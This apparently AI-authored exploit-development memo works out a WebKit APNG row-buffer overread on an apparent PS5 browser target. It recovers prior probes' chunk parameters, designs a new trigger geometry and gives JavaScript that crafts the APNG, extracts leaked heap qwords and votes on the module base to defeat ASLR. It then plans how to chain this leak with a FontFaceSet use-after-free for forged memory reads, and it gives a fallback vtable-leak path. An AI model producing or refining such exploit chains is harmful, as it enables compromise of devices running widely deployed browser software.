# APNG overread geometry: what each geometry actually reads, and the geometry to build next

**Author:** DeepSeek (dsh)
**Date:** 2026-10-26
**Sources of truth:** `WebKit-1400/Source/WebCore/platform/image-decoders/png/PNGImageDecoder.cpp` (in-tree, read line-by-line), `v674.html` + its embedded base64 APNG (decoded), Devon's issue-47 comment, V784/V725 board data.
**Status:** geometry math is **HIGH** (derived from source, reproduced against all three teams' measured numbers). Carrier-object attribution is **MEDIUM** (two candidate layers, with a discriminating test). Recommendations are testable and falsifiable; see §8.

---

## 0. TL;DR

1. **V674's geometry is not unknown.** Its inline APNG is `IHDR 16384x1, depth 8, color type 0 (gray), non-interlaced`, `acTL frames=1 plays=0`, `fcTL w=1 h=1 x=0 y=0`, chunk order `IHDR, acTL, IDAT, fcTL, fdAT, IEND`, canvas `16384x1`, `getImageData(0,0,16384,1)`. So V674's overread is **49,152 bytes**, not 16,383 - it is the *largest* window of the three, not the smallest.
2. The leak length is exactly `3 x IHDR_W` bytes, taken from a libpng row buffer allocated at `3 x fcTL_w` bytes. All three teams' measured tails reproduce to the byte from this formula (5568, 510, ~49K). Nothing about a "width ratio" is involved; the ratio is just a consequence.
3. **`x_offset` is provably inert for this leak** in this WebKit revision. It is read at `PNGImageDecoder.cpp:631-634` and used only for `frameRect` (`:815-823`) and the bounds check (`:645-649`). It never reaches the row buffer, the synthetic sub-IHDR (`:902` copies only w/h), or `rowAvailable`. T510's `x_offset=80` result is a **confound**, not a cause - see §4.2.
4. v725 reaches module pointers **not because of its width or its 5568-byte length**, but because its row-buffer request (`193 B`) and its page's allocation history leave a libc-arena object *containing WebKit `.text` pointers* inside the window. V674's tiny `4 B` request plus its own 64-image grooming history put it in a different neighbourhood; T510's 558-byte read is too short to reach past the row buffer + `prev_row` + zlib state.
5. **The +0x7850 value is a code pointer, not a vtable.** Devon's own note says "+0x7850 is CODE segment (not data.rel.ro)". The real `CanvasRenderingContext2D` vtable is `module+0x31868c0`. This matters: the leaked family is a **callback cluster** (libpng callbacks), which is why a *set* of ~6-12 module offsets repeats with one base.
6. **`0x8_00000000` is not a module band.** Observed module bases are `0x8_21358000` (V784 family) and `0x8_38588000` (v725 fingerprint), while heap is observed from `0x8_08...` to `0x8_7F...`. The ranges **overlap**. A `hi32 == 8` filter (as used in `v733.html:93`) classifies module pointers as heap. Any classifier built on address range alone is broken.
7. Recommended next probe: `W=4096, H=1, ct=2 (RGB), fw=64` as the primary, with an `fw` sweep `{16, 64, 128, 192}` in the same page load, **no image-decode grooming before the trigger**, `BigUint64Array` extraction, and a **pairwise-offset cluster vote** instead of a range filter.
8. **Yes, the module leak and the FontFaceSet UAF can share one page load** - APNG first, fully torn down, then the UAF. They live in different arenas (libc vs bmalloc/fastMalloc), so they do not contend for the same slots. Preconditions in §6.

---

## 1. V674's real parameters (recovered from code)

`v674.html:35` embeds the APNG as base64. Decoding it:

```
IHDR  len=13  w=16384 h=1 bd=8 ct=0 il=0      <- ct=0 = GRAYSCALE, not RGB
acTL  len=8   frames=1 plays=0
IDAT  len=39  39B
fcTL  len=26  seq=0 w=1 h=1 x=0 y=0 op=0
fdAT  len=14  seq=1 data=10B
IEND  len=0
```

`v674.html:37` sets `var W = 16384;`; `:127` `canvas.width = W; canvas.height = 1;`; `:134` `ctx.drawImage(img, 0, 0)`; `:136` `ctx.getImageData(0, 0, W, 1)`; `:152` `extractRGB(raw, W)` drops alpha and yields `3*W = 49152` bytes (`:78-86`).

Chunk order is the **working layout A** (`acTL, IDAT, fcTL, fdAT`), i.e. the hidden-default-image form. Keep it.

So: V674 is a **16384-wide grayscale 1x1-frame APNG**, and its leak window is **49,152 B**. The "16383 B" figure in the brief is the per-pixel shortfall `W - fw`; the actual read is 3 bytes/pixel because `png_set_gray_to_rgb` is applied (`PNGImageDecoder.cpp:380-381` main, `:720-721` sub).

---

## 2. The leak, exactly (source walkthrough)

The vulnerable copy is `PNGImageDecoder::rowAvailable` at `:437`, reached for **APNG sub-frames** via `processingStart` (`:883`).

```cpp
// :530-532
auto* destRow = buffer.backingStore()->pixelAt(0, rowIndex);
int width = size().width();          // <-- MAIN image width (IHDR W)
...
// :542-545  (opaque path: hasAlpha == false)
for (int x = 0; x < width; ++x, pixel += 3, ++address)
    *address = 0xFF000000 | pixel[0] << 16 | pixel[1] << 8 | pixel[2];
```

`pixel` is `rowBuffer`, which for the sub-frame is the **sub-decoder's** libpng row buffer. The sub-decoder is a second `png_struct` created at `:893` with a synthetic IHDR whose width/height come from the fcTL:

```cpp
// :902
memcpy(m_dataIHDR + 8, chunk->data + 4, 8);   // fcTL width, height ONLY
```

and whose transforms are applied in `frameHeader()` (`:703-730`), ending in `png_read_update_info` (`:729`), which is where libpng allocates:

* `row_buf   = png_malloc(rowbytes + 1)`  -> **libc malloc** (no `png_set_mem_fn` anywhere in the file; `png_create_read_struct` at `:121` and `:893` uses default allocators)
* `prev_row  = png_calloc(rowbytes + 1)` -> **libc calloc (zeroed)**

with `rowbytes = channels * fw`, `channels = 3` for both ct=0 (after `gray_to_rgb`) and ct=2.

Hence, per sub-frame row:

```
A (allocation) = 3 * fcTL_w  (+1 filter byte)      <- where the walk starts
R (read)       = 3 * IHDR_W                        <- how far it walks
overread past the valid pixels = 3 * (IHDR_W - fcTL_w)      <- the number the teams measured
raw bytes past the allocation  = R - A                      <- one byte less (the filter byte)
```

`width` comes from `size()`, the **main** decoder's size - the sub-decoder's `frameHeader` never calls `setSize`. That is the whole bug: IHDR-sized read, fcTL-sized allocation.

### 2.1 All three teams reproduce to the byte

| | IHDR | ct | bpp | fcTL | `A` (row_buf) | glibc chunk | `R` (read) | overread | measured tail |
|---|---|---|---|---|---|---|---|---|---|
| **V674** | 16384x1 | 0 gray | 3 | 1x1 | `3*1+1 = 4 B` | `0x20` | `3*16384 = 49152` | **49149** | ~49 KB (matches `opus46__apng_class704_leak.md:56`) |
| **v725** | 1920x1 | 2 RGB | 3 | 64x1 | `3*64+1 = 193 B` | `0xD0` | `3*1920 = 5760` | **5568** | 5568 reported |
| **T510** | 186x1 | 2 RGB | 3 | 16x1 | `3*16+1 = 49 B` | `0x40` | `3*186 = 558` | **510** | 510 reported |

Three measured tails differing by exactly `3*(W-fw)` is the strongest evidence in this comparison: it confirms the read bound (IHDR) and the allocation bound (fcTL) independently, on three parameter sets.

**Consequence:** V674 has the *longest* walk of the three (8.5x v725, 88x T510) and still got zero module pointers. **Length is not the discriminator.** Any theory that says "go wider to reach module memory" is already falsified by V674's own data.

### 2.2 What sits in the window, layer by layer

Allocation order inside one sub-frame decode (`frameHeader` -> `png_read_update_info` -> first fdAT byte):

```
[ row_buf      3*fw + 1 ]   <- A: decoded pixels land here (valid), overwritten each row
[ prev_row     3*fw + 1 ]   <- calloc: guaranteed zeros
[ inflate_state  ~0x1B0 ]   <- zlib, libc (ZALLOC -> png_malloc)
[ zlib window    32 KiB ]   <- libc, allocated on first inflate; only 3*fw bytes written
[ next chunk ...        ]
```

So the *first nonzero byte of the leak is at window offset `2*(3*fw+1)`*, and everything interesting starts at `2*A + sizeof(inflate_state)` unless `row_buf` happened to split a freed object (§3.2).

Predicted per geometry:

* V674: zeros at `[0,8)`, zlib state at `[8,~440)`, payload from ~`440` to `49152` -> **~48.7 KB of carrier**.
* v725: zeros at `[0,386)`, state at `[386,~818)`, payload ~`818` to `5760` -> **~4.9 KB of carrier**.
* T510: zeros at `[0,98)`, state at `[98,~530)`, payload only `530` to `558` -> **~30 B of carrier**. Twelve 8-byte words. **That is exactly the "12 pointer words" T510 reported.**

T510 is not a different phenomenon. It is the same phenomenon with a window too short to see anything but the zlib state header.

---

## 3. Q1 - What actually makes v725 reach module memory?

### 3.1 The decoder never "reaches module memory"

Every geometry reads the **libc arena**, because libpng's `png_malloc` is `malloc` and WebKit never installs a custom allocator (`PNGImageDecoder.cpp:121, :893`; no `png_set_mem_fn`, no `png_create_read_struct_2`). Module pointers are not "reached"; they are **inherited**: bytes left in the libc arena by whatever object previously occupied the chunks in the window.

So the question is not "how far can the overread reach" but "what was in the chunk the overread walks through".

### 3.2 The two candidate carriers

**(A) A freed `png_struct` split by the row-buffer allocation - MEDIUM.**
`png_struct` is libc-malloc'd by `png_create_read_struct` and holds WebKit `.text` pointers: `error_fn` (`decodingFailed`), `warning_fn` (`decodingWarning`), `read_data_fn` and progressive `info_fn`/`row_fn`/`end_fn` (`headerAvailable`, `rowAvailable`, `pngComplete`, `frameHeader`). That is 6-8 module code pointers in one ~`0x2E0-0x3C0` object. Two `png_struct`s exist per APNG decode (main `:121`, sub `:893`), and both are freed at `processingFinish` (`:928`).

This is almost certainly what the v725/V733 fingerprint is: a **cluster of WebKit code pointers whose offsets differ by tens of KB** (`0x7850, 0x58B0, 0x5910, 0x5A70, 0xA8D0, 0xAA00, 0xAA30, 0xD2B48, 0xD5708, 0xD90D8, 0xE0938`) - the shape of *distinct adjacent functions from one translation unit*, i.e. the PNG decoder's own callbacks, not struct fields and not a vtable array. It also explains why Devon's `+0x7850` is "CODE segment": it is `read_data_fn`-class code, not a vtable.

**(B) The 32 KiB zlib window - HIGH for "this is where the bulk of the bytes come from".**
The window is the only 32 KiB libc chunk in the pipeline, it is allocated after `prev_row`, and it is written only in its first `3*fw` bytes. Everything past that is **stale heap from the previous occupant of a 32 KiB chunk**. This is why V674's 48 KB window is pointer-dense (1651 pointer-shaped words = 27% of 6144 words): it is walking a recycled 32 KiB chunk, not a 4-byte allocation's neighbours.

Both carriers coexist. (B) supplies the volume; (A) supplies the module-relative values. A geometry only yields module pointers if **(A) is inside the (B) region**, or if the row buffer itself splits (A).

### 3.3 Why V674 and T510 missed, concretely

* **T510**: `R = 558` ends at window offset 558, ~30 bytes past `inflate_state`. It barely enters the carrier. No geometry with `W=186, fw=16` can ever see 4.9 KB of carrier - it is arithmetically excluded. `W` must go up, not `fw` down.
* **V674**: `R = 49152` is ample, but `A = 4 B` means the row buffer is served from the `0x20` fastbin/tcache, the busiest small-object bin in a WebContent process; it never splits a `0x2E0` `png_struct`. Worse, V674 runs **64 canvas-PNG decodes as grooming** (`v674.html:200-210`, `GROOM_WIDTHS 64..8192 x 8 reps`). Each decode allocates and frees its own 32 KiB zlib window and up-to-24 KiB row buffer, so by the time the trigger runs the recycled 32 KiB chunk holds **decompressed pixel data from the grooming images**, not a `png_struct`. V674 engineered exactly the wrong arena state: it filled the carrier with pixels.
* **v725**: `A = 193 B` is a `0xD0`-class request that *can* split a freed `png_struct`, and the page's shorter decode history left the 32 KiB carrier holding a pointer-dense object rather than pixels. It won the arena lottery by doing less.

**One-line answer to Q1:** the difference is the size class of `3*fcTL_w` (which decides whether the row buffer carves a `png_struct`) plus the page's prior libc allocation history (which decides what the recycled 32 KiB carrier contains). The IHDR width only decides how much of that you get to see.

---

## 4. Q2 - ratio, x_offset, or overread length?

### 4.1 Width ratio: **no**
The ratio is not an input to anything. `rowAvailable` does not know or care about `W/fw`; it uses `W` for the loop bound and `fw` only through the buffer libpng allocated. V674's ratio is 16384:1 and it saw no module pointers; T510's x_offset variant (ratio 186:16) reportedly did. A ratio cannot explain both.

### 4.2 `x_offset`: **provably inert for the leak**
* Parsed at `:631-634` into `m_xOffset`.
* Used at `:645-649` only to validate `x_offset + width <= IHDR width`.
* Used at `:815-823` only to build `frameRect` and clamp it.
* **Not** used in `processingStart` (`:883-914`), so it is not in the synthetic sub-IHDR (`:902` copies `w,h` only).
* **Not** used in `rowAvailable` (`:437-554`); the destination row always starts at column 0 (`:530`).

For a 1-frame APNG, `x_offset` cannot change a single byte of the leaked window. T510's A/B changed at least one other thing. The most likely one: the generator wrote `fcTL w = x_offset + frame_w` (a common off-by-design when the payload covers columns `0..x+w`). If T510's `x_offset=80` build had `fcTL w = 96`, then `A = 3*96+1 = 289 B` -> `0x140` chunk, a completely different bin, and the result is explained without any `x_offset` magic.

**Required check:** dump the fcTL of the T510 x_offset build and read `w`. If `w == 16`, the A/B is confounded and a re-run with everything frozen will reproduce the 510-byte window byte-for-byte.

### 4.3 Overread length: **necessary but not sufficient**
`R` must exceed `2*A + sizeof(inflate_state)` to leave the bookkeeping and reach the carrier. T510 fails this test; V674 and v725 pass it. Passing it does not guarantee module pointers (V674 proves that); it only makes them *possible*. Past that point, more `R` buys more of the carrier, with diminishing returns and rising fault risk (§5.4).

| variable | effect on module-pointer yield |
|---|---|
| `IHDR_W` | sets `R = 3W`; must clear `2A + 0x1B0`; beyond that, more reach |
| `fcTL_w` | sets `A = 3fw`; selects the malloc bin the walk starts in |
| `x_offset` | **none** (decode path provably ignores it) |
| `IHDR_H` | none for `H=fh=1`; with `fh>1` you get `fh` re-reads of the same window |
| `frames>1` | **negative**: `m_currentFrame != 0` allocates a `3*W*H` interlace buffer (`:456-459`) and `row` then points *into* it (`:519`), killing the overread |

**Keep `frames = 1`.** A second frame silently disables the bug for that frame.

---

## 5. Q3 - the geometry to build

### 5.1 Primary geometry

```
IHDR : W = 4096, H = 1, bit depth 8, color type 2 (RGB), compression 0, filter 0, interlace 0
acTL : frames = 1, plays = 0
fcTL : w = 64, h = 1, x_offset = 0, y_offset = 0, dispose = 0 (none), blend = 0 (source)
order: IHDR, acTL, IDAT, fcTL, fdAT, IEND          <- layout A, as V674
canvas: 4096 x 1 ; drawImage(img,0,0) ; getImageData(0,0,4096,1)
```

Resulting window:

```
A = 3*64 + 1 = 193 B           (0xD0 chunk - png_struct-splitting class)
R = 3*4096   = 12288 B
bytes past the allocation = 12095 B   (12096 past the valid pixels)
layout: [0,193) row pixels | [193,386) prev_row zeros | [386,~818) inflate_state | [818,12288) carrier
```

Why these numbers:

* `ct=2` avoids alpha entirely: `m_reader->hasAlpha()` is false (`:423`), so the loop takes the `pixel += 3` branch (`:543`) and hardcodes `0xFF000000`. No premultiply flooring, no `a==0` pixel loss.
* `W=4096` keeps `R = 12 KiB`, i.e. **under one 16 KiB PS5 page** if the row buffer is at least 4 KiB into its page, and at most one boundary crossing. V674's 48 KiB crosses three. This is the main safety improvement.
* `fw=64` gives `A=193`, the same class as v725's measured success; a `0xD0` request can split a `0x2E0` `png_struct` while leaving `0x210` of its tail.
* `H=1, frames=1` keeps `m_currentFrame == 0`, so no interlace buffer is created (`:456-459`) and `row == rowBuffer` (`:515`), i.e. the overread is live.

### 5.2 In-page sweep (do not bet on one geometry)

One page load, four triggers, each with its own `Image`/canvas and each fully dropped before the next:

| run | `fcTL w` | `A` | chunk | purpose |
|---|---|---|---|---|
| S1 | 16 | 49 | `0x40` | small-bin control (should reproduce T510's "few words") |
| S2 | 64 | 193 | `0xD0` | primary (v725 class) |
| S3 | 128 | 385 | `0x190` | splits `png_struct`, leaves a large tail |
| S4 | 192 | 577 | `0x250` | same, tail-only variant |

Each run beacons: `offset of first nonzero qword`, `count of qwords with hi32==8`, the first 64 qwords after the zero prefix, and **the offset of the first qword whose low12 == 0x850** (the primary fingerprint). Four runs answer "which bin gives the callback cluster" once, on the actual 14.10 build.

If a sweep is too expensive on device, run **S2 only** first; it is the single most likely winner.

### 5.3 Grooming: invert what V674 did

V674's 64 image-decode grooming cycles are the prime suspect for poisoning the 32 KiB carrier with pixels. For the next probe:

* **Do not decode any images before the sweep.** The page should do nothing but create canvases and decode the four APNGs.
* To test the carrier theory, run a **second half** in the same page where, before the trigger, you decode **1 large PNG (W=4096)** then **~24 tiny PNGs (8x8)**, and drop them. That frees one 32 KiB window chunk and then carves ~24 `png_struct`s (`0x2E0` each ~ 17 KiB) into it, leaving callback-bearing bytes in the hole that the trigger's own 32 KiB window can reuse. Compare the cluster offset between the un-groomed and groomed halves.
* Never use `canvas.toDataURL()` PNGs at large widths for grooming: they are precisely what fills the carrier with pixel data.

### 5.4 Extraction (DAZ-safe)

`getImageData` gives RGBA with `A=0xFF` in the opaque path. Drop alpha into a fresh `Uint8Array(3*W)` (12288 B, a multiple of 8, so `BigUint64Array` at offset 0 is legal) and read pointers as `BigUint64Array`, never through `Float64Array`/`lineWidth`. Scan with stride 8 from offset 0 only: the `Uint8Array` is a byte-exact copy of the heap window (`rowAvailable` maps byte `k` to pixel `k`), and `malloc` user pointers are 16-byte aligned, so `q % 8 == 0` is the correct alignment.

### 5.5 Classifier (this is where the previous probes went wrong)

Do **not** filter on `hi32 == 8`: module `.text` (`0x8_2135..`, `0x8_3858..`) and heap (`0x8_08..`, `0x8_7F..`) share that high word. Do **not** filter on a range: the bands overlap.

Use a **pairwise offset vote** over the known callback offsets, which is invariant to the slide:

```
OFFS = [0x7850, 0x58B0, 0x5910, 0x5A70, 0xA8D0, 0xAA00, 0xAA30,
        0xD2B48, 0xD5708, 0xD90D8, 0xE0938]

for each observed value p with (p >> 32) == 8:
    for each o in OFFS:
        base = p - o
        if base % 0x4000 == 0 and 0x8_00000000 <= base < 0x8_80000000:
            votes[base] += 1

accept base if votes[base] >= 3           # >=3 distinct offsets agree
reject if base + 0x7850 not in an executable mapping
```

This is a strict improvement over `v733.html:93-140`, which (a) gated on `hi32==8` (conflates heap), (b) matched **low 32 bits only** (a heap cluster with the same low-word deltas matches), (c) required the primary pointer to have `low12 == 0x850` (silently returns nothing if the primary callback is not the one leaked), and (d) accepted a base without checking page alignment or that `base+0x7850` is mapped executable. All four are fixable in ~20 lines.

**Validation, in increasing strength:**
1. `base % 0x4000 == 0` and `0x8_00000000 <= base < 0x8_80000000`.
2. At least 3 distinct `OFFS` entries agree (v725: 12/12; require 3 as a floor).
3. `base+0x7850` lies in the same executable segment as the other accepted offsets.
4. Once the alias read works: `read32(base) == 0x464C457F` (`\x7fELF`) and `read16(base+16) == 3` (ET_DYN). Only this is *proof*; everything above is a fingerprint.

### 5.6 Fallback if the APNG stays a lottery

The module base does not need APNG at all. The alias path already gives a bit-preserving read (`getLineDash`), and `CanvasRenderingContext2D`'s vtable is at object `+0`. Pointing `m_stateStack.m_buffer` at `context_object - 168` and reading the vector leaks the vtable, hence `base = vtable - 0x31868c0`. That path is deterministic and does not depend on arena history. ASLR is boot-deterministic (3/3 cold boots identical), so one successful APNG leak per boot is enough - but if the sweep does not produce a `>=3` vote, take the alias path and stop spending device cycles on APNG geometry.

---

## 6. Q4 - combining the module leak with the FontFaceSet UAF in one page load

**Yes, and the ordering matters.**

```
1. await img.decode()                      // APNG fully decoded, window captured
2. data = ctx.getImageData(...); base = classify(data)
3. drop: img = null; canvas.width = 1; data = null; any Uint8Array copies = null
4. force GC once                            // BEFORE the UAF exists
5. FontFaceSet UAF sequence                 // unchanged from the current probe
6. reclaim (string/768B), forge, read
```

Why this is safe:

* **Arena isolation.** The whole APNG path (libpng `png_struct`, `row_buf`, `prev_row`, zlib state/window) is **libc `malloc`**. The UAF target (`CanvasRenderingContext2D`, 704/768 B) and the reclaim strings are **bmalloc/FastMalloc/libpas**. Different arenas, no shared free lists, so the APNG cannot consume the CRC2D slot and the reclaim cannot corrupt the APNG window.
* **The one shared arena is bmalloc.** The only bmalloc allocation in the APNG path is the frame backing store, 3-channel source expanded to `W*4*H = 16 KiB` at `W=4096` (`:450`, `buffer.initialize(size(), ...)`). 16 KiB is far from the 704/768 class, so it cannot land in the UAF slot. **Keep `W` at 4096 for this reason**; `W=16384` allocates 64 KiB, which starts to be a plausible neighbour for larger classes.
* **Timing.** `rowAvailable` runs on the thread driving `png_process_data`, i.e. the decode that `img.decode()`/`drawImage` forces. `await img.decode()` guarantees the window exists before step 3, so the later GC cannot change what you already read.
* **GC.** Step 4 (GC before the UAF exists) prevents image objects from being collected during the reclaim window, which is the one way the APNG could perturb UAF timing. Do not GC between the UAF and the reclaim.

Constraints:

* **One page load, one UAF.** The APNG part is read-only and idempotent, so it can be repeated; the UAF cannot. If the sweep is used, do all four runs **before** the UAF, then pick the base from the winning run.
* **Do not keep the canvas alive.** After step 3 the 4096x1 canvas must be resized to 1x1 (as V674 does at `:182`) so its backing store is released before the UAF.
* **Do not re-decode the APNG after the leak.** A second decode can reuse and overwrite the exact carrier chunks that produced the base, and can even take the interlace-buffer path.
* **Fault budget.** The overread is a wild read. At `W=4096` it is one page; at `W=16384` it is three. If the page must survive to the UAF, 4096 is the right choice.

---

## 7. Probe skeleton (beacon-oriented)

```js
// ---- build an APNG in-page (no external asset, params explicit) ----
function apngB64(W, H, fw, fh) { /* emit IHDR ct=2, acTL 1/0, IDAT, fcTL(fw,fh,0,0), fdAT, IEND */ }

async function runOne(W, fw) {
  const cv = document.createElement('canvas');
  cv.width = W; cv.height = 1;
  const cx = cv.getContext('2d', { alpha: false });
  cx.fillStyle = '#000'; cx.fillRect(0, 0, W, 1);

  const img = new Image();
  img.src = 'data:image/png;base64,' + apngB64(W, 1, fw, 1);
  await img.decode();
  cx.drawImage(img, 0, 0);

  const px = cx.getImageData(0, 0, W, 1).data;
  const raw = new Uint8Array(W * 3);
  for (let p = 0; p < W; p++) {
    raw[p*3] = px[p*4]; raw[p*3+1] = px[p*4+1]; raw[p*3+2] = px[p*4+2];
  }
  const u64 = new BigUint64Array(raw.buffer, 0, raw.length >> 3);

  // zero prefix = row_buf + prev_row, both 3*fw+1
  let nz = 0; while (nz < u64.length && u64[nz] === 0n) nz++;

  const OFFS = [0x7850n,0x58B0n,0x5910n,0x5A70n,0xA8D0n,0xAA00n,0xAA30n,
                0xD2B48n,0xD5708n,0xD90D8n,0xE0938n];
  const votes = new Map();
  for (let i = 0; i < u64.length; i++) {
    const v = u64[i];
    if ((v >> 32n) !== 8n) continue;
    for (const o of OFFS) {
      const b = v - o;
      if ((b & 0x3FFFn) !== 0n) continue;
      if (b < 0x800000000n || b >= 0x880000000n) continue;
      votes.set(b, (votes.get(b) || 0) + 1);
    }
  }
  let best = 0n, bestN = 0;
  for (const [b, n] of votes) if (n > bestN) { best = b; bestN = n; }

  cv.width = 1; img.src = '';                       // release before next run
  return { W, fw, nz, words: u64.length, best, bestN,
           first: Array.from(u64.slice(nz, nz + 8), x => '0x' + x.toString(16)) };
}
```

Beacon `nz` first. `nz` should equal `ceil(2*(3*fw+1)/8)` words. If `nz` is much larger, the box is zeroing fresh arena memory and no geometry will help; if it matches, the model in §2.2 is confirmed on device.

---

## 8. What would falsify this

| claim | falsifier |
|---|---|
| Read bound is IHDR width, allocation is fcTL width | a measured tail != `3*(W-fw)` for any parameter set (all three current sets match) |
| `x_offset` is inert | a byte-identical re-run of T510's A/B (same `fcTL w`, only `x_offset` changed) produces a different window |
| `frames>1` kills the leak | a 2-frame APNG still leaks a >1 KiB tail on frame 0 |
| module pointers live in a `png_struct` callback cluster | the accepted offsets do not fall inside one module's `.text`, or the offsets are not stable across 3 runs |
| carrier is the 32 KiB zlib window | `nz` does not match `2*(3fw+1)` and the payload begins far from `2*A + 0x1B0` |
| V674's grooming poisoned the carrier | un-groomed `W=16384, fw=1` produces a module cluster |

---

## 9. Corrections to premises in the brief

1. **"V674 IHDR/fcTL unknown"** - recovered: `16384x1`, ct=0, `fcTL 1x1`, order A. Overread is **49,152 B**, not 16,383.
2. **"vtable at module+0x7850"** - Devon's own note: `+0x7850` is **CODE**; the CRC2D vtable is `+0x31868c0`. Treat `+0x7850` as a function pointer (almost certainly a libpng callback).
3. **"T510 0x80D-0x81F = module band"** - every observed module base is **above** that (`0x8_21358000`, `0x8_38588000`), and V674's heap region includes `0x812xxxxxxx`. Treat `0x80D-0x81F` as **heap/libc** until proven otherwise. Address range cannot separate module from heap on this target.
4. **"ratio 1920 vs 186 vs ours"** - not a causal variable; V674's ratio is 256x larger than v725's and it saw nothing.
5. **"x_offset=80 got module-band pointers"** - `x_offset` cannot affect the decode (`:631-634`, `:815-823`, `:902`, `:437-554`). Check the fcTL `w` in that build; a widened `w` (e.g. 96) is the likely real cause.

---

## 10. Evidence index

| claim | location |
|---|---|
| V674 APNG params | `v674.html:35` (base64), decoded chunk dump; `v674.html:37,127,134,136,152` |
| read bound = main IHDR width | `PNGImageDecoder.cpp:532` |
| 3-byte copy loop | `PNGImageDecoder.cpp:542-545` |
| gray->rgb (both readers) | `:380-381` (main), `:720-721` (sub) |
| sub-IHDR = fcTL w/h only | `:902` |
| sub `png_struct` creation | `:893`, `:899-900` |
| no custom libpng allocator | `:121`, `:893` (no `png_set_mem_fn` anywhere) |
| `row_buf`/`prev_row` at `png_read_update_info` | `:729` (libpng allocates row_buf + calloc prev_row) |
| interlace buffer kills the overread | `:456-459`, `:515-519` |
| fcTL offsets parsed | `:631-634` |
| offsets used only for frameRect | `:645-649`, `:815-823` |
| frame backing store = full IHDR size | `:447-453` |
| measured 5568 / 510 / ~49K | task brief; `opus46__apng_class704_leak.md:56` |
| +0x7850 is code, not vtable | `devon_comment_47_1725.md:10`, `:21` |
| fingerprint matcher's weaknesses | `v733.html:79-140` |
| observed module bases | `deepseek__2135_base_leak_fix.md:5` (0x8_21358000), V725 `P1-MB1` (0x8_38588000) |
| V674 grooming recipe | `v674.html:200-210`, `GROOM_WIDTHS`/`GROOM_REPS` |
